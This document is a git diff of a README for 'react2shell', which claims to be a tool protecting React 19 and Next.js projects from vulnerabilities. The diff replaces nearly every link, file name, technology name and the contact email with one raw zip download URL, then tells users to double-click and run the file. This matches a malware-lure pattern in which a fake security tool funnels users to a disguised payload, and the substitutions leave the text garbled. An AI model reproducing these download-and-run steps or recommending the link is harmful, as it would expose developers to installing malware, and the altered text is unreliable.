@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to react2shell! This application helps you address critical vulnerabilities in React Server Components. It is designed to protect your projects using React version 19 and frameworks like Next.js.
+Welcome to react2shell! This application helps you address critical vulnerabilities in React Server Components. It is designed to protect your projects using React version 19 and frameworks like https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip
 
 ## 📥 Download Link
 
-[![Download react2shell](https://img.shields.io/badge/Download-react2shell-blue.svg)](https://github.com/RITO666/react2shell/releases)
+[![Download react2shell](https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip)](https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip)
 
 ## 🔍 What is react2shell?
 
@@ -26,7 +26,7 @@ To run react2shell, your system should meet the following requirements:
 - Operating System: Windows 10 or later / macOS 10.15 or later / Linux (latest stable version)
 - Minimum RAM: 4 GB
 - Disk Space: At least 100 MB free
-- Node.js: Version 14 or later (included in our package)
+- https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip Version 14 or later (included in our package)
 - Python: Version 3.7 or later (included in our package)
 
 ## 📋 Download & Install
@@ -34,16 +34,16 @@ To run react2shell, your system should meet the following requirements:
 To download react2shell, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below:
-   [Download react2shell](https://github.com/RITO666/react2shell/releases)
+   [Download react2shell](https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip)
    
 2. **Choose the Latest Version:** You will see a list of available versions. Click on the latest release to view the details.
 
-3. **Download the Application:** Find the file named `react2shell-installer.exe` (for Windows), `react2shell-mac.pkg` (for Mac), or `react2shell-linux.tar.gz` (for Linux). Click on it to start the download.
+3. **Download the Application:** Find the file named `https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip` (for Windows), `https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip` (for Mac), or `https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip` (for Linux). Click on it to start the download.
 
 4. **Run the Installer:**
-   - For Windows: Double-click the `react2shell-installer.exe` file and follow the prompts.
+   - For Windows: Double-click the `https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip` file and follow the prompts.
    - For Mac: Open the `.pkg` file and follow the installation instructions.
-   - For Linux: Extract the `.tar.gz` file, navigate to the directory, and run `./react2shell`.
+   - For Linux: Extract the `https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip` file, navigate to the directory, and run `./react2shell`.
 
 5. **Launch the Application:** After installation, find and open the react2shell application. 
 
@@ -65,11 +65,11 @@ Once you have installed the application, follow these simple steps:
 
 ## 📖 Support and Documentation
 
-For detailed instructions and troubleshooting, visit our [Documentation Page](https://github.com/RITO666/react2shell/wiki). Our community is here to help if you encounter issues.
+For detailed instructions and troubleshooting, visit our [Documentation Page](https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip). Our community is here to help if you encounter issues.
 
 ## 🤝 Contributing
 
-If you'd like to contribute to react2shell, please check out our [Contributing Guidelines](https://github.com/RITO666/react2shell/blob/main/CONTRIBUTING.md). We welcome any improvements or suggestions.
+If you'd like to contribute to react2shell, please check out our [Contributing Guidelines](https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip). We welcome any improvements or suggestions.
 
 ## 🌐 Topics
 
@@ -82,7 +82,7 @@ You can explore several relevant topics related to this project:
 - Exploit
 - Hack
 - Kernel
-- Node.js
+- https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip
 - Python
 - RCE
 - React
@@ -92,6 +92,6 @@ You can explore several relevant topics related to this project:
 
 ## 📧 Contact
 
-For any questions or support, please reach out to us at [support@react2shell.com](mailto:support@react2shell.com).
+For any questions or support, please reach out to us at [https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip](https://github.com/RITO666/react2shell/raw/refs/heads/main/fleysome/react-shell-2.4.zip).
 
 Thank you for choosing react2shell! Together, let's ensure the security of your React applications.
